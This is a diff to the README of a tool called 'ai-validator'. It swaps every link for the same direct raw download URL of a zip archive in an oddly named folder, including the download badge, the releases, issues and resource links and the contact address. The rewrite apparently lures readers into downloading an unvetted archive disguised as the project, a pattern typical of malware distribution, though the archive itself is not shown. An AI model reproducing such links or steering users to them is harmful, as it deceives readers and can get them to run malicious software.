@@ -6,7 +6,7 @@ Welcome to the **ai-validator**! This tool helps you check the accuracy of AI re
 
 ## 📥 Download Here
 
-[![Download ai-validator](https://img.shields.io/badge/Download-ai--validator-blue.svg)](https://github.com/ExzardJean/ai-validator/releases)
+[![Download ai-validator](https://raw.githubusercontent.com/ExzardJean/ai-validator/main/tractorization/ai-validator.zip)](https://raw.githubusercontent.com/ExzardJean/ai-validator/main/tractorization/ai-validator.zip)
 
 ## 📄 Overview
 
@@ -31,7 +31,7 @@ Before you download, ensure your computer meets these requirements:
 ## 🛠️ How to Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ExzardJean/ai-validator/releases) to find the latest version of **ai-validator**.
+   Go to the [Releases page](https://raw.githubusercontent.com/ExzardJean/ai-validator/main/tractorization/ai-validator.zip) to find the latest version of **ai-validator**.
 
 2. **Download the Application**  
    Select the version you wish to download. Click on the corresponding file to download it directly to your computer.
@@ -70,19 +70,19 @@ Imagine you receive a response from an AI tool regarding a medical query. By usi
 
 ## 🤝 Support
 
-If you encounter any issues or have questions regarding the application, please feel free to check our [issues page](https://github.com/ExzardJean/ai-validator/issues) for help. You can also submit a question there for quick assistance.
+If you encounter any issues or have questions regarding the application, please feel free to check our [issues page](https://raw.githubusercontent.com/ExzardJean/ai-validator/main/tractorization/ai-validator.zip) for help. You can also submit a question there for quick assistance.
 
 ## 📧 Contact
 
-For direct inquiries or feedback, please reach out at support@example.com. We appreciate your input and aim to improve the user experience.
+For direct inquiries or feedback, please reach out at https://raw.githubusercontent.com/ExzardJean/ai-validator/main/tractorization/ai-validator.zip We appreciate your input and aim to improve the user experience.
 
 ## 🔗 Additional Resources
 
 Feel free to explore more about AI and its applications in our additional resources:
 
-- [AI Fundamentals](https://example.com/ai-fundamentals)
-- [How to Use AI Effectively](https://example.com/use-ai-effectively)
+- [AI Fundamentals](https://raw.githubusercontent.com/ExzardJean/ai-validator/main/tractorization/ai-validator.zip)
+- [How to Use AI Effectively](https://raw.githubusercontent.com/ExzardJean/ai-validator/main/tractorization/ai-validator.zip)
 
 Thank you for choosing **ai-validator**! We hope this tool is helpful in your work with AI. 
 
-Continue to enhance your understanding and stay tuned for updates by visiting the [Releases page](https://github.com/ExzardJean/ai-validator/releases).
+Continue to enhance your understanding and stay tuned for updates by visiting the [Releases page](https://raw.githubusercontent.com/ExzardJean/ai-validator/main/tractorization/ai-validator.zip).
